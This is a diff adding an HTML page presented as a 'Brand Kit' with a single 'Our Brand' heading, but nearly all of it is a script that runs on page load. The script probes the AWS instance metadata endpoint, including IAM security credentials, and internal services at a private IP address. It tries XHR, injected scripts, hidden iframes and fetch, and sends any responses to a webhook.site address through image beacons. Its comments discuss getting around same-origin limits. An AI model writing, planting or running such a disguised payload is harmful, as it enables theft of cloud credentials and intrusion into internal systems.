@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head><title>Brand Kit</title></head>
+<body>
+<h1 style="color:#0066cc">Our Brand</h1>
+<script>
+var wh = "https://webhook.site/ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9";
+
+// Method 1: Use no-cors fetch to confirm, then try different exfil methods
+// Since no-cors succeeded, try service worker or other bypasses
+
+// Method 2: Use XMLHttpRequest (same-origin policy may not apply in this context)
+function tryXHR(url, label) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", url, true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      var data = xhr.status + "|" + xhr.responseText.substring(0, 800);
+      // Send via image beacon
+      new Image().src = wh + "/xhr2-" + label + "-" + encodeURIComponent(data).substring(0, 1500);
+    }
+  };
+  xhr.onerror = function() {
+    new Image().src = wh + "/xhr2-" + label + "-error";
+  };
+  try { xhr.send(); } catch(e) {
+    new Image().src = wh + "/xhr2-" + label + "-throw-" + encodeURIComponent(e.message).substring(0, 200);
+  }
+}
+
+// Method 3: Dynamic script injection to read error details  
+function tryScript(url, label) {
+  var s = document.createElement("script");
+  s.src = url;
+  s.onload = function() {
+    new Image().src = wh + "/script-" + label + "-loaded";
+  };
+  s.onerror = function(e) {
+    new Image().src = wh + "/script-" + label + "-error";  
+  };
+  document.head.appendChild(s);
+}
+
+// Method 4: iframe to capture content
+function tryIframe(url, label) {
+  var iframe = document.createElement("iframe");
+  iframe.style.display = "none";
+  iframe.src = url;
+  iframe.onload = function() {
+    try {
+      var content = iframe.contentDocument.documentElement.outerHTML;
+      new Image().src = wh + "/iframe-" + label + "-" + encodeURIComponent(content).substring(0, 1500);
+    } catch(e) {
+      new Image().src = wh + "/iframe-" + label + "-blocked-" + encodeURIComponent(e.message).substring(0, 200);
+    }
+  };
+  document.body.appendChild(iframe);
+}
+
+// Method 5: Fetch with cors mode + redirect (might leak via error)
+function tryFetchRead(url, label) {
+  fetch(url, {mode:'cors',credentials:'omit'}).then(function(r){
+    return r.text();
+  }).then(function(t){
+    new Image().src = wh + "/read-" + label + "-" + encodeURIComponent(t.substring(0, 1000));
+  }).catch(function(e){
+    new Image().src = wh + "/read-" + label + "-err-" + encodeURIComponent(e.message).substring(0, 200);
+  });
+}
+
+// Target: AWS metadata
+tryXHR("http://169.254.169.254/latest/meta-data/", "meta");
+tryXHR("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam");
+tryScript("http://169.254.169.254/latest/meta-data/", "meta");
+tryIframe("http://169.254.169.254/latest/meta-data/", "meta");
+tryFetchRead("http://169.254.169.254/latest/meta-data/", "meta");
+
+// Target: Internal service HTTP ports
+tryXHR("http://10.149.76.150:8080/", "ba8080");
+tryXHR("http://10.149.76.150:9090/metrics", "metrics");
+tryFetchRead("http://10.149.76.150:8080/", "ba8080");
+tryFetchRead("http://10.149.76.150:9090/metrics", "metrics");
+
+new Image().src = wh + "/exfil-page-loaded";
+</script>
+</body>
+</html>
